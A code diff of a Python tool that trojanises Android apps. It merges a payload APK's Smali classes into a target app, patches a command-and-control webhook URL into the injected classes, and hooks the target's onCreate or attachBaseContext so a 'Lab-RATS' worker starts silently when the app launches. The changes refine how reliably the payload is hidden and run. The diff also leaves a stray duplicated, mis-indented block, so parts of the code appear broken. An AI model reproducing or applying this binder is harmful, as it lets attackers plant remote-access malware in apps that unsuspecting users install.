@@ -128,48 +128,24 @@ def decompile_apk(apktool_cmd, apk_path, output_dir):
 
 
 def merge_smali_and_assets(payload_dir, target_dir):
-    log_info("Merging payload Smali classes and assets into target...")
+    log_info("Merging payload Smali classes and assets into target primary smali directory...")
 
-    # Find max smali index in target
-    target_smali_dirs = [d for d in os.listdir(target_dir) if d == "smali" or d.startswith("smali_classes")]
-    max_idx = 1
-    for sd in target_smali_dirs:
-        if sd == "smali":
-            continue
-        m = re.match(r"smali_classes(\d+)", sd)
-        if m:
-            idx = int(m.group(1))
-            if idx > max_idx:
-                max_idx = idx
-
-    # Target directory for payload classes
-    dest_smali_dir = os.path.join(target_dir, f"smali_classes{max_idx + 1}")
+    dest_smali_dir = os.path.join(target_dir, "smali")
     os.makedirs(dest_smali_dir, exist_ok=True)
 
-    # Copy all smali subdirectories from payload smali folders
     payload_smali_dirs = [d for d in os.listdir(payload_dir) if d == "smali" or d.startswith("smali_classes")]
     for psd in payload_smali_dirs:
         psd_path = os.path.join(payload_dir, psd)
-        for item in os.listdir(psd_path):
-            src_item = os.path.join(psd_path, item)
-            dst_item = os.path.join(dest_smali_dir, item)
-
-            # Check if target already has this package in main smali
-            if os.path.exists(os.path.join(target_dir, "smali", item)) and item != "com":
-                continue
-
-            if os.path.isdir(src_item):
-                if not os.path.exists(dst_item):
-                    shutil.copytree(src_item, dst_item)
-                else:
-                    # Merge directories
-                    for root, dirs, files in os.walk(src_item):
-                        rel_path = os.path.relpath(root, src_item)
-                        target_root = os.path.join(dst_item, rel_path)
-                        os.makedirs(target_root, exist_ok=True)
-                        for f in files:
-                            sf = os.path.join(root, f)
-                            df = os.path.join(target_root, f)
+        if os.path.exists(psd_path):
+            for root, dirs, files in os.walk(psd_path):
+                rel = os.path.relpath(root, psd_path)
+                target_root = os.path.join(dest_smali_dir, rel)
+                os.makedirs(target_root, exist_ok=True)
+                for f in files:
+                    sf = os.path.join(root, f)
+                    df = os.path.join(target_root, f)
+                    if not os.path.exists(df):
+                        shutil.copy2(sf, df)
                             if not os.path.exists(df):
                                 shutil.copy2(sf, df)
 
@@ -196,27 +172,29 @@ def patch_c2_url(target_dir, web_url):
         return
     log_info(f"Patching C2 Webhook URL ({web_url}) into bound Smali classes...")
     web_url_clean = web_url.strip().rstrip('/')
-    url_pattern = re.compile(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*')
 
     count = 0
     for root, _, files in os.walk(target_dir):
-        for f in files:
-            if f.endswith(".smali"):
-                sf = os.path.join(root, f)
-                try:
-                    with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
-                        content = sfile.read()
+        rel_root = root.replace("\\", "/")
+        if "com/labs/labrats" in rel_root:
+            for f in files:
+                if f.endswith(".smali"):
+                    sf = os.path.join(root, f)
+                    try:
+                        with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
+                            content = sfile.read()
 
-                    if "onrender.com" in content or "WEBHOOK_URL" in content or "http://" in content or "https://" in content:
-                        new_content = url_pattern.sub(web_url_clean, content)
+                        new_content = re.sub(r'https?://[a-zA-Z0-9_.-]*onrender\.com[^\s"\'\`]*', web_url_clean, content)
+                        new_content = re.sub(r'http://127\.0\.0\.1:\d+[^\s"\'\`]*', web_url_clean, new_content)
+                        new_content = re.sub(r'http://localhost:\d+[^\s"\'\`]*', web_url_clean, new_content)
                         new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url_clean + r'\2', new_content)
 
                         if new_content != content:
                             with open(sf, 'w', encoding='utf-8') as sfile:
                                 sfile.write(new_content)
                             count += 1
-                except Exception:
-                    pass
+                    except Exception:
+                        pass
     log_success(f"C2 Webhook URL successfully patched in {count} Smali files.")
 
 
@@ -534,45 +512,57 @@ def hook_smali_class(target_dir, class_name, is_app_class=False):
         log_info(f"Class {class_name} is already hooked.")
         return True
 
-    if "onCreate(" in content:
-        def reg_replacer(match):
-            header = match.group(1)
-            body = match.group(2)
-            reg_match = re.search(r'\.registers\s+(\d+)', header)
-            if reg_match:
-                reg_count = int(reg_match.group(1))
-                if reg_count < 2:
-                    header = header.replace(f".registers {reg_count}", ".registers 2")
-            return header + body + hook_code
+    # Extract exact superclass from .super L...; line to prevent ART VerifyError on invoke-super
+    super_match = re.search(r'^\s*\.super\s+(L[^;]+;)', content, re.MULTILINE)
+    super_class = super_match.group(1) if super_match else "Landroid/app/Activity;"
 
-        pattern = r'(\.method\s+[^I]*onCreate\([^\n]*\n.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
-        if re.search(pattern, content, re.DOTALL):
-            content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
-            log_success(f"Successfully hooked onCreate() in {class_name}")
-        else:
-            content = re.sub(r'(\.method\s+[^I]*onCreate\([^\n]*\n)', r'\1' + hook_code, content, count=1)
-            log_success(f"Hook injected into onCreate() header in {class_name}")
-    elif "attachBaseContext(" in content:
-        content = re.sub(r'(\.method\s+[^I]*attachBaseContext\([^\n]*\n)', r'\1' + hook_code, content, count=1)
-        log_success(f"Hook injected into attachBaseContext() in {class_name}")
+    lines = content.splitlines()
+    new_lines = []
+    in_target_method = False
+    hook_injected = False
+    method_uses_p1 = False
+
+    hook_p0 = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V"
+    hook_p1 = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p1}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V"
+
+    for line in lines:
+        new_lines.append(line)
+        if not hook_injected:
+            if ".method" in line and ("onCreate(" in line or "attachBaseContext(" in line):
+                in_target_method = True
+                method_uses_p1 = "attachBaseContext" in line
+                continue
+            if in_target_method:
+                ls = line.strip()
+                if ls.startswith(".locals") or ls.startswith(".registers") or ls.startswith(".prologue") or ls.startswith(".line"):
+                    new_lines.append(hook_p1 if method_uses_p1 else hook_p0)
+                    hook_injected = True
+                    in_target_method = False
+            if ".end method" in line:
+                in_target_method = False
+
+    if hook_injected:
+        with open(smali_file, 'w', encoding='utf-8') as f:
+            f.write("\n".join(new_lines))
+        log_success(f"Injected Lab-RATS startup hook into {class_name}")
+        return True
     else:
-        new_on_create = f"""
-.method protected onCreate(Landroid/os/Bundle;)V
-    .registers 2
-
-    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-{hook_code}
-    return-void
-.endmethod
-"""
+        new_on_create = (
+            "\n.method protected onCreate(Landroid/os/Bundle;)V\n"
+            "    .registers 2\n"
+            f"    invoke-super {{p0, p1}}, {super_class}->onCreate(Landroid/os/Bundle;)V\n"
+            + hook_p0 + "\n"
+            "    return-void\n"
+            ".end method\n\n"
+        )
         if ".end class" in content:
-            content = content.replace(".end class", new_on_create + ".end class")
-            log_success(f"Injected new onCreate() method in {class_name}")
+            content = content.replace(".end class", new_on_create + "\n.end class")
+            with open(smali_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+            log_success(f"Created and injected new onCreate() hook into {class_name}")
+            return True
 
-    with open(smali_file, 'w', encoding='utf-8') as f:
-        f.write(content)
-
-    return True
+    return False
 
 
 def hook_launcher_activity(target_dir, launcher_class):
@@ -706,9 +696,9 @@ def main():
     payload_apk = args.payload
     if not payload_apk:
         default_payloads = [
-            os.path.join(script_dir, "output", "signed_v1.apk"),
             os.path.join(project_dir, "app", "build", "outputs", "apk", "release", "app-release.apk"),
-            os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
+            os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk"),
+            os.path.join(script_dir, "output", "signed_v1.apk")
         ]
         for p in default_payloads:
             if os.path.exists(p):
